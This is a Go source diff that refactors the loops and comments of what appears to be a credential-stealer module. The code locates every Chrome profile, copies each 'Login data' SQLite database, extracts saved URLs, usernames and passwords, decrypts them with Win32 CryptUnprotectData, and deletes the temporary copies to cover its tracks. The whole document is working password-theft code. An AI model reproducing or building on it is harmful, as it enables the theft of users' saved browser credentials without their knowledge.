@@ -18,14 +18,16 @@ func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 		profilesWithTrash, _, _, _ := jsonparser.Get(fileWithUserData, "profile")
 
 		var profileNames []string
+		
+		//todo delete this piece of... is there a more smartly way?
 		jsonparser.ObjectEach(profilesWithTrash, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
 			profileNames = append(profileNames, string(key))
 			return nil
 		}, "info_cache")
 
 		var temporaryDbNames []string
-		for i := range profileNames {
-			dbPath := fmt.Sprintf("%s\\%s\\Login data", path, profileNames[i])
+		for _, profileName := range profileNames {
+			dbPath := fmt.Sprintf("%s\\%s\\Login data", path, profileName)
 			if _, err := os.Stat(dbPath); err == nil {
 				//randomDbName := common.RandStringRunes(10)
 
@@ -38,8 +40,8 @@ func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 			}
 		}
 
-		for dbNum := range temporaryDbNames {
-			db, err := sql.Open("sqlite3", temporaryDbNames[dbNum])
+		for _, tmpDB := range temporaryDbNames {
+			db, err := sql.Open("sqlite3", tmpDB)
 			if err != nil {
 				//log.Panic(err.Error())
 				return nil, false
@@ -60,8 +62,9 @@ func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
 				data = append(data, common.UrlNamePass{actionUrl, username, common.Win32CryptUnprotectData(password, false)})
 			}
 
-			os.Remove(temporaryDbNames[dbNum])
-			// log.Println("Removing temp db")
+			// remove already used database
+			os.Remove(tmpDB)
+
 			return data, true
 		}
 	}
@@ -93,10 +96,10 @@ func ChromeExtractDataRun() common.ExtractCredentialsResult {
 
 	var allCreds []common.UrlNamePass
 
-	for i := range chromePathsUserData {
-		if _, err := os.Stat(chromePathsUserData[i]); err == nil {
+	for _, ChromePath := range chromePathsUserData {
+		if _, err := os.Stat(ChromePath); err == nil {
 
-			var data, success = chromeModuleStart(chromePathsUserData[i])
+			var data, success = chromeModuleStart(ChromePath)
 			if success && data != nil {
 				allCreds = append(allCreds, data...)
 			}
